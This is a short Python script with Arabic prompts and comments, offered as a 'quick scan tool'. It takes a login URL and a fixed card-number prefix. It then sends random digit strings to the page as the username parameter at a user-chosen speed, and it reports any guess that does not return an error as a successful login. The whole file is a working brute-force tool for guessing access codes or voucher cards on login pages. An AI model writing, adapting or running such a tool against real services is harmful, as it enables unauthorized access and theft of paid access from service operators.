import time
import random
import requests

# الألوان الخاصة بالطرفية
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

def main():
    print(f"{GREEN}=== أداة الفحص السريعة عبر بايثون ==={RESET}\n")
    
    # إدخال البيانات من قبل المستخدم
    login_url = input("أدخل رابط الموقع أو الصفحة (مثال: http://g.com/login): ").strip()
    fixed_prefix = input("أدخل الجزء الثابت في بداية الكرت (مثال: 9h): ").strip()
    
    try:
        total_length = int(input("أدخل الطول الكلي للرقم (مثال: 10): "))
        max_count = int(input("أدخل عدد المحاولات المطلوبة (مثال: 100): "))
        # جعل السرعة قابلة للتحكم (افتراضياً سريعة جداً 0.1 ثانية أو حسب رغبتك)
        speed = float(input("أدخل الزمن الفاصل بين المحاولات بالثانية (مثال 0.1 للفحص السريع جداً، أو 0 بدون انتظار): ") or 0.1)
    except ValueError:
        print(f"{RED}[خطأ] يجب إدخال أقيم صحيحة!{RESET}")
        return

    chars = "0123456789"
    pwd_len = total_length - len(fixed_prefix)
    
    if pwd_len < 0:
        print(f"{RED}[خطأ] الطول الكلي أصغر من طول الجزء الثابت!{RESET}")
        return

    print(f"\n{GREEN}[*] جاري بدء الفحص السريع على الرابط: {login_url}{RESET}\n")
    
    counter = 0
    while counter < max_count:
        random_part = "".join(random.choice(chars) for _ in range(pwd_len))
        cpwd = fixed_prefix + random_part
        
        try:
            # تقليل وقت الـ timeout لتصبح الاستجابة أسرع
            response = requests.get(login_url, params={"username": cpwd}, timeout=2)
            
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"{GREEN}[تم تسجيل الدخول بنجاح] -> {cpwd}{RESET}")
            else:
                print(f"{RED}[غير شغال / مرفوض] -> {cpwd}{RESET}")
                
        except requests.exceptions.RequestException:
            print(f"{RED}[خطأ في الاتصال] -> {cpwd}{RESET}")
            
        counter += 1
        if speed > 0:
            time.sleep(speed)

    print(f"\n{GREEN}[*] انتهت عملية الفحص بنجاح.{RESET}")

if __name__ == "__main__":
    main()
